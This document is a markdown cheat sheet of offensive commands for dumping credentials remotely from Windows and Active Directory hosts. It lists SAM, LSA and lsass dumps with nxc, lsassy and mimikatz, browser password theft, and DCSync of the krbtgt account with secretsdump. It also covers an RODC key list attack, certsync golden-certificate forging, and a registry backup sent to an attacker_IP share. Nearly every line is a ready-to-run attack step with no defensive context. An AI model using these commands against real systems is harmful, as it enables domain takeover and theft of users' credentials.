# Various python tools to dump credentials remotely

## 1) Check RunAsPPL

Check if RunAsPPL is enabled in the registry

    nxc smb <target> -u user1 -p password -M runasppl

## 2) Dump credentials remotely

##### Dump SAM database on a machine

    nxc smb <target> -u user1 -p password --sam

##### Dump LSA secrets on a machine

    nxc smb <target> -u user1 -p password --lsa
    
##### In a PDF with LSA_reg2pdf, exec get_pdf, and get_bootkey on your host to parse the PDF

    .\get_pdf.exe 1
    python3 get_bootkey.py

##### Dump through remote registry

    reg.py -o \\<attacker_IP>\share domain.local/user1:password@<target> backup
    reg.py domain.local/user1:password@<target> query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'

##### Dump with an alternative method, regsecrets.py, more discreet

    regsecrets.py domain.local/user1:password@target.domain.local

##### Dump the lsass process and parse it

    nxc smb <target> -u user1 -p password -M lsassy
    nxc smb <target> -u user1 -p password -M nanodump
    nxc smb <target> -u user1 -p password -M mimikatz
    nxc smb <target> -u user1 -p password -M procdump

    lsassy -u user1 -p password -d domain.local <target>

    minidump domain.local/user1:password@dc.domain.local:/C$/Windows/Temp/lsass.dmp

##### Retrieve Chrome passwords

    nxc smb <target> -u user1 -p password -M enum_chrome

##### Make a DCSync attack on all the users (NT hashes, Kerberos AES key, etc)

    secretsdump.py domain.local/user1:password@<DC>
    nxc smb <target> -u user1 -p password --ntds

##### DCSync only the NT && LM hashes of a user

    secretsdump.py -just-dc-user 'krbtgt' -just-dc-ntlm domain.local/user1:password@<DC>

##### Retrieve NT hashes via Key List Attack on a RODC
##### Attempt to dump all the users' hashes even the ones in the Denied list
##### Low privileged credentials are needed in the command for the SAMR enumeration

    keylistattack.py -rodcNo <krbtgt_number> -rodcKey <krbtgt_aes_key> -full domain.local/user1:password@RODC-server
    
##### Attempt to dump a specific user's hash

    keylistattack.py -rodcNo <krbtgt_number> -rodcKey <krbtgt_aes_key> -t user1 -kdc RODC-server.domain.local LIST

##### Certsync - retrieve the NT hashes of all the users with PKINIT
##### Backup the private key and the certificate of the Root CA, and forge Golden Certificates for all the users
##### Authenticate with all the certificate via PKINIT to obtain the TGTs and extract the hashes with UnPAC-The-Hash

    certsync -u administrator -p 'password' -d domain.local -dc-ip <DC_IP>

##### Provide the CA .pfx if it has been obtained with another way

    certsync -u administrator -p 'password' -d domain.local -dc-ip <DC_IP> -ca-pfx CA.pfx
